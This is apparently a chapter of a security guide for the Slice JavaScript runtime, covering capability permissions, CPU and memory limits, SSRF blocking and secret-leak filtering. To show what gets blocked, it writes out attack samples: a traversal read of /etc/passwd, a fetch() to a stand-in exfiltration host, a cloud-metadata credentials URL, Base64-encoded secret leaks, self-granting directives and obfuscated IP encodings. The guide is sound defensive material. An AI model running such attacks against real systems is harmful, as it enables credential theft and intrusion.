# Chapter 04: Zero-Trust Security Guide: OCap Permissions, Fuel Limits, SSRF Shield & Egress DLP

In Node.js and Bun, every `npm` package you install and every script you run inherits **100% of your OS user's permissions**: it can read `~/.ssh/id_rsa`, modify `Object.prototype`, open sockets to AWS/GCP cloud metadata (`169.254.169.254`), exfiltrate `process.env` secrets, or lock up a CPU core with `while (true) {}`. Even Deno's CLI flags (`--allow-read`, `--allow-net`) apply to the **entire OS process**, not to individual HTTP requests or plugins inside the same process.

**Slice enforces MicroVM-grade Zero-Trust security per isolate and per HTTP request**, using five concentric rings of defense:

| Ring | Defense Layer | What It Protects Against | Violation Error (`SandboxViolation`) |
| :--- | :--- | :--- | :--- |
| **Ring 1** | **SES Intrinsic Lockdown** | Prototype pollution (`Object.prototype.polluted = true`) across shared realms | `IntrinsicMutationBlocked` |
| **Ring 2** | **OCap Filesystem & Subprocess Tokens (`FsCap` & `ExecCap`)** | Unauthorized file read/write, `..` traversal, & unlisted subprocess execution | `FsReadDenied` / `FsWriteDenied` / `ExecDenied` |
| **Ring 3** | **OCap Network & Env Tokens (`NetCap` & `EnvCap`)** | Unauthorized outbound `fetch()` & `process.env` / `env()` credential harvesting | `NetAccessDenied` / `EnvAccessDenied` |
| **Ring 4** | **Deterministic CPU Fuel, Memory & Checkpoint Cage** | Infinite loop CPU DoS (`while(true){}`), heap/KV exhaustion, & checkpoint abuse | `CpuFuelExhausted` / `MemoryCeilingExceeded` |
| **Ring 5** | **Resolved-IP SSRF Shield, Egress Secret DLP & PKRU Domain Scaffolding** | Cloud metadata & private/loopback DNS rebinding SSRF, Base64/raw secret exfiltration, & Linux `x86_64` `WRPKRU` register domain switching (`pkey_mprotect` heap tagging not yet wired) | `NetAccessDenied` (`SSRF_*`, catchable `ERR_SLICE_NET_DENIED`) / `EgressSecretLeakBlocked` (fatal) |

This chapter shows you how to configure and test every security control in your applications.

---

## 1. Zero Ambient Authority by Default

When you run a script with `slice run script.ts` (without a `slice.toml` or `--allow-*` flags), the isolate spawns with **`CapabilityToken::pure_compute()`**:
- **Filesystem (`node:fs`):** `0` readable paths, `0` writable paths.
- **Network (`fetch`, WebSockets, Sockets):** `0` allowed outbound hosts.
- **Subprocesses (`node:child_process`):** `0` allowed binaries (`allow_exec = []`, Deny-All).
- **Environment (`env()` / `process.env`):** Only `NODE_ENV="production"` is exposed; host OS environment variables (such as `AWS_SECRET_ACCESS_KEY` or `GITHUB_TOKEN`) are **never** leaked into the isolate unless explicitly granted.

---

## 2. Controlling Filesystem Access (`allow_read` & `allow_write`)

You can grant path-prefix read and write capabilities in `slice.toml`, via top-of-file inline directives (`// @slice-allow-read: [...]`), via `SLICE_ALLOW_READ` / `SLICE_ALLOW_WRITE` environment variables, via CLI flags, or per sub-sandbox in `Slice.evalSandbox()`.

### 2.1 Via `slice.toml`
```toml
[capabilities]
allow_read = ["/app/public", "/app/config", "/tmp/cache"]
allow_write = ["/tmp/cache"]
```

### 2.2 Via CLI Flags
```bash
slice run ./src/pipeline.ts --allow-read=/app/public --allow-read=/tmp/cache --allow-write=/tmp/cache
```

### 2.3 Path Traversal (`..`), NUL Byte & Device/UNC Blocking
Every `node:fs` function (`readFileSync`, `writeFileSync`, `appendFileSync`, `existsSync`, `mkdirSync`, `readdirSync`, `statSync`, `renameSync`, `unlinkSync`, `rmSync`, `symlinkSync`, `chmodSync`) normalizes path separators and **unconditionally rejects any path containing `..`, NUL bytes (`\0`), Win32 device namespaces (`\\.\`), or UNC network shares (`\\server\share`)**.
For example, if you grant `--allow-read=/app/public`, an attacker attempting:
```typescript
import * as fs from "node:fs";
fs.readFileSync("/app/public/../../etc/passwd", "utf8");
```
is immediately blocked with a catchable `ERR_SLICE_FS_DENIED` error (recorded in `deniedCapabilities`, promoted to `SandboxViolation::FsReadDenied` if uncaught):
```text
OCap Violation: lacks filesystem read authority for path '/app/public/../../etc/passwd'
```

### 2.4 Copy-on-Write VFS Mutations (Host Disk Preservation)
Even when `allow_write` is granted for a directory, `writeFileSync`, `appendFileSync`, `copyFileSync`, `renameSync`, `unlinkSync`, `rmSync`, and `openSync`/`writeSync` operate strictly inside the isolate's inode-backed in-memory copy-on-write VFS (`BOA_VFS_STATE`). Unlinking or removing a path records a VFS tombstone that masks any underlying host entry inside the isolate without deleting files from the host OS disk (keeping unlinked open file descriptors readable/writable until `closeSync`), and `Slice.checkpoint()` / `Slice.restore()` rolls VFS inodes, open FDs, tombstones, and memory budget accounting back in `< 5 us`.

### 2.5 Virtual-Only In-Memory VFS Mounts (`virtual_mounts` / `--virtual-mount`)
When an AI agent or untrusted script needs a scratch or output directory (such as `/artifacts` or `/scratch`) without **any** visibility into the host filesystem, configure a **virtual-only VFS mount**:
- **CLI / Env / Manifest:** `--virtual-mount=/artifacts`, `SLICE_VIRTUAL_MOUNT=/artifacts`, or `[capabilities] virtual_mounts = ["/artifacts"]` in `slice.toml` (also automatically mounted for `/artifacts` when `--artifacts-dir=<dir>` or `slice mcp` `artifacts: true` is used).
- **Zero Host Fall-Through:** Every mounted prefix is pre-seeded as an empty, `host_opaque` VFS directory. Even if a host directory exists at the exact same path, `existsSync`, `readdirSync`, `statSync`, `readFileSync`, and `realpathSync` **never** read from or write to the host OS.
- **Monotonic Attenuation:** Child sandboxes (`Slice.evalSandbox` / `CapabilityToken::attenuate`) can narrow a virtual mount (e.g., `/artifacts` -> `/artifacts/sub`) but can never widen it or promote a virtual mount into a host `allow_read` or `allow_write` grant.
- **Memory & Egress DLP Enforcement:** All bytes written to a virtual mount are metered against the tenant's `memory_limit_bytes`. When artifacts are drained via `SliceIsolate::drain_vfs`, `slice run --artifacts-dir`, or `slice mcp`, every file is scanned by Ring 4 Egress DLP (`--audit-egress` / `.env` Auto-DLP); matching files are dropped as `AuditedSecret` and recorded as `artifact:<path>` in `deniedCapabilities`.

---

## 3. Controlling Outbound Network Access (`allow_net`) & The Built-In SSRF Shield

Outbound `fetch()` and `Slice.fetchSync()` calls are guarded by two layers: your **OCap Host Allowlist (`allow_net`)** and Slice's **Cloud Metadata & Private CIDR SSRF Firewall**.

### 3.1 Explicit Host Allowlisting (Recommended for Production)
Grant only the exact `hostname:port` (or `hostname`, which automatically permits `:80` and `:443`) that your service needs to call:

```toml
[capabilities]
allow_net = [
    "api.stripe.com:443",
    "api.openai.com:443",
    "127.0.0.1:18095"
]
```
Or via CLI:
```bash
slice run ./src/webhook.ts --allow-net=api.stripe.com:443,127.0.0.1:18095
```
If your code (or a compromised npm dependency) tries to call `await fetch("https://evil-collector.org/steal")`, Slice blocks the request before DNS resolution and rejects with a catchable `ERR_SLICE_NET_DENIED` error (`OCap Violation: lacks outbound network authority for host 'evil-collector.org:443'`), records it in `deniedCapabilities`, and promotes it to `SandboxViolation::NetAccessDenied` if uncaught.

### 3.2 Built-In Resolved-IP SSRF Protection & `allow_private_networks` Opt-In
In Node.js, Bun, or Deno (`deno run --allow-net`), if a user passes `http://169.254.169.254/latest/meta-data/iam/security-credentials/` or a granted public hostname whose DNS points to `127.0.0.1` or `10.0.0.15:6379`, your server will reach cloud instance credentials or internal services (Server-Side Request Forgery / SSRF).

**In Slice, the Resolved-IP SSRF Shield is always active across every outbound protocol (`fetch()`, redirects, `WebSocket`, TCP/TLS sockets, and UDP):**
1. **Cloud Metadata Endpoints Are Unconditionally Blocked (Even With `allow_private_networks = true`):**
   - `169.254.169.254` (AWS EC2 / GCP / Azure IMDS), `169.254.170.2` (AWS ECS), `169.254.170.23` / `[fd00:ec2::23]` (AWS EKS Pod Identity), `168.63.129.16` (Azure WireServer), `100.100.100.200` (Alibaba Cloud), `[fd00:ec2::254]` (AWS IPv6 IMDS), and `metadata.google.internal` / `metadata.goog` (GCP Metadata DNS).
2. **Pre-Connect DNS Resolved-IP Firewall (`resolve_and_verify_ssrf_socket_addrs`):**
   - Before opening any TCP, TLS, WebSocket, or UDP socket, Slice resolves DNS once, validates **every returned `SocketAddr` (IPv4 and IPv6, including IPv4-mapped IPv6 `::ffff:127.0.0.1`, NAT64, SIIT, 6to4, and Teredo)**, and connects directly to the validated `SocketAddr` (preventing DNS rebinding).
   - **All DNS hostnames** (whether granted explicitly in `allow_net` or matched via `allow_net = ["*"]`) are blocked from connecting to loopback (`127.0.0.0/8`, `::1`), RFC 1918 private (`10/8`, `172.16/12`, `192.168/16`), IPv6 ULA (`fc00::/7`), link-local (`169.254/16`, `fe80::/10`), CGNAT (`100.64/10`), unspecified (`0.0.0.0/8`, `::`), broadcast, multicast, or special-use ranges by default (`SSRF_PRIVATE_IP_BLOCKED`, catchable `ERR_SLICE_NET_DENIED`).
   - Internal endpoints can be reached only by: (a) naming the exact literal IP in `allow_net` (e.g. `127.0.0.1:18095`), (b) naming `localhost:<port>` in `allow_net` (restricted strictly to loopback IPs), or (c) opting into private DNS resolution via `allow_private_networks = true` in `slice.toml` / `--allow-private-networks` / `SLICE_ALLOW_PRIVATE_NETWORKS=1` (monotonically attenuated in child sandboxes; cloud metadata remains unconditionally blocked).
3. **Zero-Trust Hop-by-Hop Redirect Guard (`301` / `302` / `303` / `307` / `308`):**
   - When an allowed upstream server returns a `30x` redirect (`redirect: "follow"`), Slice re-verifies the target `Location` URL's host, port, and DNS-resolved IP against `allow_net` and the SSRF firewall **before following the hop** (up to 5 hops).
   - If a redirect crosses origins (different scheme, host, or port), Slice automatically strips sensitive `Authorization`, `Cookie`, and `Proxy-Authorization` headers so credentials are never leaked to a redirect target.
   - Supports `redirect: "follow"` (default), `redirect: "manual"` (returns the `30x` response with its `location` header), and `redirect: "error"`.

---

## 4. Environment Variables (`allow_env`), `.env` Auto-DLP & Outbound Egress DLP (`--audit-egress`)

### 4.1 Granting Specific Environment Variables
You can inject specific `KEY=VALUE` pairs (or import specific keys from your host shell) via `slice.toml` or `--allow-env`:

```bash
# Inject explicit key=value
slice run ./src/index.ts --allow-env=STAGE=production --allow-env=REGION=eu-west-1

# Or pass --allow-env=MY_HOST_VAR to copy MY_HOST_VAR from the host OS environment
export MY_HOST_VAR="hello"
slice run ./src/index.ts --allow-env=MY_HOST_VAR
```

Inside your TypeScript code:
- `process.env.STAGE` returns `"production"`.
- `env("STAGE")` returns `"production"`, whereas calling `env("UNDECLARED_KEY")` immediately traps with `SandboxViolation::EnvAccessDenied`.

### 4.2 Blocking Secret Exfiltration with `--audit-egress` & Auto-DLP `.env`
When your application or AI agent needs a secret key (such as `STRIPE_SECRET_KEY` or `OPENAI_API_TOKEN`) to sign a request, how do you guarantee that a bug or prompt injection never leaks that secret into:
- `console.log()` / `stdout`
- HTTP response bodies or Server-Sent Events (`Response.sse`)
- Outbound `fetch()` URLs, headers, or `POST` bodies - even if the attacker encodes the secret in **Base64** or **Base64URL**?

You have two ways to enable Slice's **Egress Data Loss Prevention (DLP) Firewall**:

1. **Automatic `.env` DLP (`--env-file=.env` or `env_file = ".env"` in `slice.toml`):**
   - Create a `.env` file:
     ```dotenv
     SERVICE_NAME=checkout-api
     PUBLIC_KEY_ID="pk_live_public_9001"
     STRIPE_SECRET_KEY="sk_live_super_secret_stripe_key"
     DB_MASTER_PASSWORD="pg_prod_password_998877"
     ```
   - When loaded via `--env-file=.env`, Slice automatically classifies `STRIPE_SECRET_KEY` and `DB_MASTER_PASSWORD` as sensitive (because their names match `*_SECRET*`, `*_TOKEN*`, `*_KEY*`, `*_PASSWORD*`, or `*_PRIVATE*`, while ignoring `PUBLIC_KEY*` and `PUBLISHABLE_KEY*`) and registers their raw, Base64, and Base64URL forms into the Egress DLP guard!
2. **Explicit `--audit-egress=<secret|auto>` & `--audit-egress-file=<path>` Flags:**
   ```bash
   # Register an explicit secret string
   slice serve ./src/server.ts --audit-egress="sk_live_super_secret_stripe_key"

   # Auto-discover sensitive keys from .env and granted environment variables without treating "auto" as a literal secret
   slice run ./src/agent.ts --audit-egress=auto

   # Load newline-delimited secrets (or KEY=VALUE entries) from a dedicated secrets file (fails closed if missing/unreadable)
   slice serve ./src/server.ts --audit-egress-file=./secrets.txt
   ```
   All security and configuration file flags (`--audit-egress-file`, `--env-file`, `--config`, `--trace`, `slice.toml` `env_file`, and trusted `// @slice-env-file`) accept both `--flag=<value>` and `--flag <value>` forms and **fail closed** with an explicit error if the target file is missing, unreadable, invalid UTF-8, or given an empty value.

### Example: Seeing Egress DLP Catch a Base64 Secret Leak
```typescript
// Suppose --audit-egress="sk_live_99887766" is active:
const leakedBase64 = Buffer.from("sk_live_99887766", "utf8").toString("base64");

// Attempting to print, fetch(), or ws.send() the Base64-encoded secret immediately traps!
console.log("Diagnostic trace:", leakedBase64);
// -> Traps with: Egress DLP Violation (EGRESS_SECRET_LEAK_BLOCKED): blocked from exfiltrating a registered audit secret
```

### 4.3 Hardened HTTP/1.1 & RFC 6455 WebSocket Wire-Protocol Defenses
Both the outbound `fetch()` / `WebSocket` client engine and the inbound `slice serve` HTTP/WebSocket server enforce strict wire-level security guards:
- **Non-Canonical IP, Cloud Metadata & Special-Use CIDR SSRF Blocking:** Cloud metadata endpoints (AWS/GCP/Azure/DO `169.254.169.254`, AWS ECS `169.254.170.2`, AWS EKS Pod Identity `169.254.170.23` / `fd00:ec2::23`, Azure WireServer `168.63.129.16`, Alibaba `100.100.100.200`, AWS IPv6 `fd00:ec2::254`, and `metadata.google.internal`) are unconditionally blocked. For all DNS hostnames by default (both explicit grants and `allow_net = ["*"]`, unless `allow_private_networks = true` or explicit literal IP / `localhost` loopback), the SSRF shield blocks octal (`0177.0.0.1`), leading-zero non-octal (`127.0.0.08`, `0169.0254.0169.0254`), hexadecimal (`0x7f.0.0.1`), integer/dword (`2130706433`), shorthand (`127.1`, `169.254.43518`), and percent-encoded (`%31%36%39...`) IPv4 encodings alongside percent-decoded authority delimiters (`%40`, `%2f`, `%00`), `:0` / invalid ports, `0.0.0.0/8`, RFC 1918, loopback, link-local (`169.254.0.0/16`, `fe80::/10`), CGNAT (`100.64.0.0/10`), benchmark (`198.18.0.0/15`), IETF protocol (`192.0.0.0/24`), multicast (`224.0.0.0/4`, `ff00::/8`), IPv6 Unique Local (`fc00::/7`), deprecated site-local (`fec0::/10`), NAT64 (`64:ff9b::/96`, `64:ff9b:1::/48`), SIIT (`::ffff:0:0/96`), and Teredo (`2001:0000::/32`) ranges.
- **RFC 9110 `tchar` Header & CRLF Injection Prevention:** Outbound and inbound header names are validated against a compile-time RFC 9110 `tchar` lookup table, and header values / request targets reject `\r`, `\n`, `\0`, and ASCII control characters to prevent HTTP Request/Response Splitting.
- **RFC 9112 Request Smuggling (`CL.TE` / `TE.CL`) & Chunked Arithmetic Guards:** `slice serve` immediately rejects requests containing both `Transfer-Encoding` and `Content-Length` or conflicting duplicate `Content-Length` headers with `400 Bad Request` (`Connection: close`), validates chunked hex sizes with checked arithmetic, and caps inbound bodies at `4 MB` (`413 Payload Too Large`) and headers at 64 fields / 64 KB (`431 Request Header Fields Too Large`).
- **Tenant-Partitioned Keep-Alive Pool & Outbound Memory Ceilings:** Warm Keep-Alive sockets are keyed by `(tenant_id, proxy_key, is_https, allow_private_networks, host_port)` so tenants and policies never share an upstream connection, and outbound HTTP responses (`64 KB` max headers, `16 MB` max body) and WebSocket frames (`4 MB` max) are strictly bounded by the active tenant's remaining memory budget (`SandboxViolation::MemoryCeilingExceeded`).

### 4.4 5-Ring OCap Subprocess Containment (`node:child_process`, `allow_exec` & `--allow-exec`)
When CLI tools or AI Code-Mode agents use `node:child_process` (`execFileSync`, `spawnSync`, `execSync`, `spawn`, `exec`, `execFile`), Slice enforces all 5 security rings:
1. **Ring 1 - OCap `ExecCap` Binary Allowlist (`allow_exec` / `--allow-exec`):** Deny-All by default (`allowed_exec_binaries: []`). Any attempt to execute a binary not explicitly granted via `--allow-exec=/usr/bin/git`, `SLICE_ALLOW_EXEC=/usr/bin/git`, or `[capabilities] allow_exec = ["/usr/bin/git"]` in `slice.toml` (or attempting path spoofing such as `/tmp/evil/git` when `/usr/bin/git` is granted) immediately traps with `SandboxViolation::ExecDenied`.
2. **Ring 2 - Environment Sanitization (`env_clear()`):** Spawned child processes **never** inherit the host OS `std::env::vars()`; they receive only the active tenant's attenuated `allowed_env_keys`.
3. **Ring 3 - Child Stdio Output Egress DLP:** Both `stdout` and `stderr` produced by a child process are scanned by `verify_egress_secrets_slice` (raw, Base64, and Base64URL forms of `--audit-egress` and `.env` Auto-DLP secrets) before returning to JavaScript (`EGRESS_SECRET_LEAK_BLOCKED`).
4. **Ring 4 - Execution Timeout & `maxBuffer` Ceiling:** Enforces hard execution timeouts (killing timed-out subprocesses) and `maxBuffer` byte ceilings.
5. **Ring 5 - CPU Fuel, Memory Accounting & Sub-Isolate Attenuation:** Subprocess output bytes are charged against the tenant's fuel and memory budgets, and `Slice.evalSandbox(code, { allowExec: [...] })` / `new Worker(url, { slice: { allowExec: [...] } })` enforce strict subset attenuation (`child.allowExec` intersected with `parent.allowExec`).

---

## 5. Deterministic CPU Fuel, Byte-Level Memory & Checkpoint Cages (`--fuel`, `--memory`, `--no-checkpoints`, `--max-checkpoints`)

Wall-clock timeouts (`setTimeout`) are unreliable for multi-tenant sandboxing because CPU load spikes cause false timeouts while still allowing an attacker to burn 100% of a CPU core for milliseconds.

Slice meters **deterministic CPU instruction fuel**, **per-tenant memory bytes**, and **guest checkpoint quotas**:

### 5.1 Setting Fuel, Memory, and Checkpoint Limits
In `slice.toml`:
```toml
[limits]
fuel = 5_000_000     # Max CPU instructions per execution / HTTP request
memory_kb = 4096     # Max 4 MB memory ceiling per tenant isolate

[capabilities]
allow_checkpoints = true
max_checkpoints = 8  # Cap total Slice.checkpoint() calls (default: unlimited; per-thread slab retains 64 newest snapshots)
```
Or on the CLI:
```bash
# Bound fuel, memory, and guest checkpoint count:
slice run ./untrusted_plugin.ts --fuel=100000 --memory=1048576 --max-checkpoints=4

# Or disable guest Slice.checkpoint() / Slice.restore() calls completely:
slice run ./untrusted_plugin.ts --no-checkpoints
```

### 5.2 What Happens When a Limit Is Exceeded
- **Infinite Loop / CPU DoS (`while (true) {}`):** Preempted deterministically on the exact instruction that exceeds `fuel`, returning `SandboxViolation::CpuFuelExhausted` (or `HTTP 403 Forbidden` in `slice serve`) while all other worker threads and tenants continue unaffected.
- **Memory Exhaustion (`Slice.kv` / VFS / allocations / buffers):** Any `Slice.kv.set(key, val)` / `Slice.kv.incr(key)`, VFS write, WebAssembly linear memory page growth, array/string expansion, or compartment allocation that pushes `memory_used_bytes` past `memory_limit_bytes` traps immediately with `SandboxViolation::MemoryCeilingExceeded`. Persistent `Slice.kv` (`EDGE_KV_SLAB`) and copy-on-write VFS (`BOA_VFS_STATE`) bytes remain accounted across pooled `--warm` `reset_for_request` turns and nested `Slice.evalSandbox` sub-tenants (rolling back uncommitted sub-tenant KV writes on child fault and reclaiming parent budget on sub-tenant key deletion).
- **Checkpoint Quota Enforcement:** If guest code calls `Slice.checkpoint()` when `--no-checkpoints` is set or after reaching `--max-checkpoints=<N>`, Slice blocks the unauthorized snapshot call immediately.

---

## 6. Untrusted Entrypoint & AI Code-Mode Directive Lockdown (`// @slice-*`, `--trust-directives` & `--no-directives`)

When running AI-generated scripts, user-submitted plugins, or downloaded snippets via `slice run <script.ts>`, an attacker or hallucinating LLM might place top-of-file inline source directives (`// @slice-allow-read: ["/"]`, `// @slice-allow-net: ["*"]`, `// @slice-allow-exec: ["/bin/sh"]`, `// @slice-env-file: .env`, `// @slice-fuel: 999999999999`) at the top of the file in an attempt to self-grant permissions.

**Slice prevents inline directive privilege escalation by default (`trust_directives = false`):**
1. **Default Monotonic Attenuation (`trust_directives = false`):**
   - **Resource & Checkpoint Limits (`// @slice-fuel`, `// @slice-memory-kb`, `// @slice-memory-mb`, `// @slice-checkpoints`, `// @slice-max-checkpoints`):** Clamped via `.min(...)` (and boolean AND for checkpoints) so an inline directive can only **reduce** (tighten) the host's configured CPU fuel, memory ceiling, or checkpoint quota, never raise it.
   - **Filesystem, Network & Subprocess Capabilities (`// @slice-allow-read`, `// @slice-allow-write`, `// @slice-allow-net`, `// @slice-allow-exec`):** Strictly intersected against the capabilities already granted by `slice.toml`, `SLICE_*` environment variables, or CLI flags. If the host granted zero read paths or zero exec binaries, inline directives result in zero read paths and zero exec binaries.
   - **Environment Variables & `.env` Files (`// @slice-allow-env`, `// @slice-env-file`):** `// @slice-env-file` is ignored unless `trust_directives` is enabled, and `// @slice-allow-env` only permits keys already granted by the host.
   - **Outbound Egress DLP (`// @slice-audit-egress`):** Always additive - a script can always register *additional* secrets to block from leaking.
   - **TLS Certificate Files (`// @slice-tls-cert`, `// @slice-tls-key`):** Ignored unless `trust_directives` is enabled so untrusted scripts cannot point the server listener at arbitrary PEM files on disk.
2. **Nested Sub-Sandboxes (`Slice.evalSandbox`) & `slice mcp` (`slice_eval_ts`):**
   - `Slice.evalSandbox(code, opts)` and the MCP `slice_eval_ts` tool **never** apply capability-granting or limit-raising `// @slice-*` directives from `code`; child capabilities are determined exclusively by `parent_caps` intersected with `opts`.
3. **Explicit Opt-In (`--trust-directives`) & Complete Directive Stripping (`--no-directives`):**
   - When writing trusted single-file local utility scripts (`#!/usr/bin/env slice`) where you intentionally want top-of-file `// @slice-allow-*` comments to grant permissions without a separate `slice.toml`, opt in via `--trust-directives`, `SLICE_TRUST_DIRECTIVES=1`, or `[capabilities] trust_directives = true` in `slice.toml` (pass `--no-trust-directives` to explicitly enforce default attenuation).
   - Passing `--no-directives` (or `--untrusted`) ignores all `// @slice-*` comments completely (even narrowing directives).

---

## 7. Auditing Your Environment (`slice verify-security`)

You can verify that all 5 security rings are active on your machine at any time by running:
```bash
slice verify-security
```
Output:
```text
[Slice Security Verifier] Executing 5 multi-tenant attack vectors...
  [PASS] Vector 1: SES Intrinsic Lockdown blocked Object.prototype pollution
  [PASS] Vector 2: OCap VFS Token blocked unauthorized /etc/shadow read
  [PASS] Vector 3: OCap Network Token blocked unauthorized evil.com exfiltration
  [PASS] Vector 4: OCap Env Token blocked unauthorized AWS_SECRET_ACCESS_KEY read
  [PASS] Vector 5: Deterministic Fuel Cage preempted while(true) DoS loop
Result: 5/5 Attack Vectors Deterministically Contained.
```

---

## 8. Hardware Memory Isolation (`MPK` / `PKRU`): Architecture, Current Status & Embedder Guidance

Security reviewers and host embedders should understand clearly what Slice's `HardwareProtectionDomain` (`crates/slice-sandbox/src/compartment/pkey.rs`) enforces today versus where language-level and OS/VM boundaries apply:

1. **Threat Model & Relationship to Rings 1-4:**
   - **Primary isolation today:** Multi-tenant isolation and `--memory` quotas are enforced in **100% safe Rust** across Rings 1-4: SES prototype lockdown (`IntrinsicRegistry::lockdown` + `__slice_check_ses`), OCap capability tokens (`FsCap`, `NetCap`, `EnvCap`, `ExecCap`), deterministic CPU fuel metering, and byte-level memory cages (`BOA_KV_MEM_BUDGET` + `SliceWasmLimiter`). Guest JavaScript (`Boa` bytecode VM) and WebAssembly (`wasmi` pure-Rust interpreter) **never emit or execute guest-controlled native machine instructions**, so guest code cannot synthesize raw pointers or execute `WRPKRU` itself.
   - **What MPK targets:** Intel/AMD Memory Protection Keys (`MPK` / `PKU`) are hardware defense-in-depth designed to mitigate hypothetical memory-safety bugs in native host code by restricting which tagged virtual memory pages the current CPU thread can read or write, without requiring a full kernel page-table (`CR3`) switch. MPK does **not** enforce `--memory` byte ceilings, prevent logic bugs in OCap rules, or mitigate CPU microarchitectural side channels.
2. **Which Memory Pages Are Tagged Today (Groundwork Status):**
   - `HardwareProtectionDomain::allocate` invokes `SYS_pkey_alloc` (syscall `330` on Linux `x86_64`) to acquire a kernel protection key (`1..=15`) and computes a `pkru_mask` that permits read/write (`0b00`) on default kernel key `0` and the active tenant's key while setting `PKEY_DISABLE_ACCESS | PKEY_DISABLE_WRITE` (`0b11`) on the other 14 keys. `enter_domain()` writes that mask into the per-thread `PKRU` register via `WRPKRU` before execution, and `Drop` resets `PKRU` to `0` and frees the key via `SYS_pkey_free` (syscall `331`).
   - **Current limitation (`SYS_pkey_mprotect` not yet wired):** Slice does **not** yet call `SYS_pkey_mprotect` (syscall `329`) to assign `Boa` GC heap pages, `wasmi` linear memory pages, `EDGE_KV_SLAB`, or VFS slabs to non-zero protection keys. Because those allocations currently remain on default kernel key `0` (which every domain must leave accessible for the Rust call stack, allocator metadata, and shared engine code), the `WRPKRU` switch currently acts as **verified register-switch groundwork** rather than active cross-tenant heap page isolation.
3. **Platform Support & How to Verify:**
   - **Active `PKRU` switching:** Linux `x86_64` on a CPU and kernel with `PKU`/`OSPKE` enabled (`grep -E 'pku|ospke' /proc/cpuinfo`).
   - **All other platforms** (Windows, macOS, Linux `aarch64` - ARM `POE` is not implemented - and VMs/containers where `SYS_pkey_alloc` returns `ENOSYS`/`EPERM`/`ENOSPC`): `HardwareProtectionDomain::allocate` deterministically assigns a virtual slot tag (`1..=15`) with `hardware_enforced = false`; `enter_domain()` and `Drop` become zero-cost no-ops.
   - **Checking status:** Run `slice doctor` to inspect `PKEY`, `PKRU Mask`, and whether Linux `x86_64` `PKRU` switching or virtual slot tagging is active, or inspect `isolate.compartment.pkey_domain.hardware_enforced` in Rust.
4. **Hardware Key Limits & Fallback Visibility:**
   - `x86_64` hardware provides 16 protection keys (`0..=15`); key `0` is reserved for default kernel/process mappings, leaving **at most 15 concurrent hardware keys per OS process**.
   - `PKRU` is a **per-hardware-thread** CPU register, and `SliceIsolate::reset_for_request` calls `rebind_slot()` so warm HTTP worker threads reuse their owned protection domain across requests without reallocating kernel keys.
   - If more than 15 `HardwareProtectionDomain` handles are live simultaneously in one process (or if the host lacks PKU), `allocate()` falls back non-fatally to `hardware_enforced = false`. Rust embedders that require hardware key allocation can check `if !isolate.compartment.pkey_domain.hardware_enforced { ... }` at worker startup.
5. **Embedder Guidance for High-Density Multi-Tenant Hosts:**
   - Pin one active `SliceIsolate` per worker thread (`slice serve --workers=N`), keep `--fuel` and `--memory` ceilings bounded per request, and let `BOA_CONTEXT_POOL` recycle clean SES-verified realms.
   - Because in-process `pkey_mprotect` heap tagging is not yet wired (and `x86_64` MPK offers 15 keys per process), deployments defending against hostile native-level kernel/hardware or compiler soundness bugs should pair Slice's in-process 5-Ring OCap sandbox with OS process isolation, `seccomp-bpf` / namespaces, or lightweight MicroVMs (`Firecracker`, `Cloud Hypervisor`, `gVisor`) per trust tier.
